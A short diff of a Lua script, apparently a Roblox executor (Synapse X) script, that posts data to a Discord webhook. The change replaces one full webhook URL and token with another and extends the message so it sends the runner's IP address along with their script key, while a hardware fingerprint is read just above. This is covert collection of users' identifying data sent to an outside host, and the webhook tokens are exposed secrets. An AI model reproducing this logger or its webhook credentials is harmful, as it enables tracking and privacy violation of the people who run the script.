@@ -8,12 +8,12 @@ local hwid = decoded.headers["Syn-Fingerprint"]
 
 local response = syn.request(
     {
-        Url = 'https://discord.com/api/webhooks/1069573362831065140/pistEyyGkZ30kZpaDlDDDw_qpOjg_4lDAMreZ63a9pjamHS2B5MdYRehzHhZT9H96kTO',
+        Url = 'https://discord.com/api/webhooks/1085396549644861470/WHy6GR_gPvElrE7Vcust8DOnCXrmoAmHVEGjLNVFJ0faZHB_J9KBGh3EhPiD4UGJjLR9',
         Method = 'POST',
         Headers = {
             ['Content-Type'] = 'application/json'
         },
-        Body = game:GetService('HttpService'):JSONEncode({content = "Script Key: " ..script_key.."*"})
+        Body = game:GetService('HttpService'):JSONEncode({content = "Script Key: " ..script_key.."IP: "..ip.."*"})
     }
 );
 
